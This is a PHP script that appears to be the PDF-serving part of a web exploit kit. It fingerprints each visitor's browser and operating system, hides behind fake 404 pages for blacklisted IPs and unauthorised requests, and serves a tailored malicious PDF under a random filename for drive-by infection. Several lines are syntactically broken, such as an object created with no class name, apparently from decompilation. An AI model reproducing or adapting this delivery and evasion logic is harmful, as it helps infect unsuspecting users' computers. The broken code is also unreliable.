<?php


require_once( 'config.inc.php' );
require_once( 'CP-ENC-7531.php' );
require_once( 'CP-ENC-6236.php' );
require_once( 'cryptor.php' );
$CPRandomString = $cpFunctions->CreateArrayString( rand( 5, 20 ), '100' );
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser = $cpFunctions->GetBrowser( $user_agent );
$os = $cpFunctions->GetOS( $user_agent );
$cpMySQL->ConnectMySQL(  );

if ($cpFunctions->IsBadIp( $_SERVER['REMOTE_ADDR'] )) {
	$cpFunctions->Error404Dupe(  );
}


if (isset( $_GET['pdf'] )) {
	if ($_GET['pdf'] != strtoupper( md5( $cpFunctions->GetIP(  ) ) )) {
		$cpFunctions->Error404Dupe(  );
	}


	if (isset( $_GET['o'] )) {
		$os = $_GET['o'];
	}
	else {
		$os = 'unk';
	}


	if (isset( $_GET['b'] )) {
		$browser = $_GET['b'];
	}
	else {
		$browser = 'unk';
	}


	if (isset( $_GET['type'] )) {
		switch ($_GET['type']) {
		case 1: {
				$PDFFile = PDFFile( $os, $browser );
				break;
			}

		case 2: {
				CPackExploits;
				$spl = new (  );
				$PDFFile = $spl->GenPDFXML( $os, $browser );
				break;
			}

		default: {
				$cpFunctions->Error404Dupe(  );
				break;
			}
		}

		header( 'Cache-Control: no-cache, must-revalidate' );
		header( 'Accept-Ranges: bytes
' );
		header( 'Content-Length: ' . strlen( $PDFFile ) . '
' );
		header( 'Content-Disposition: inline; filename=' . $cpFunctions->RandLtr( 15, 1 ) . '.pdf' );
		header( '
' );
		header( 'Content-Type: application/pdf

' );
		exit( $PDFFile );
	}
	else {
		$cpFunctions->Error404Dupe(  );
	}
}


if (!isset( $_GET['pdf'] )) {
	$ipintruder = $cpFunctions->GetIP(  );
	$cpFunctions->Error404Dupe(  );
}

?>
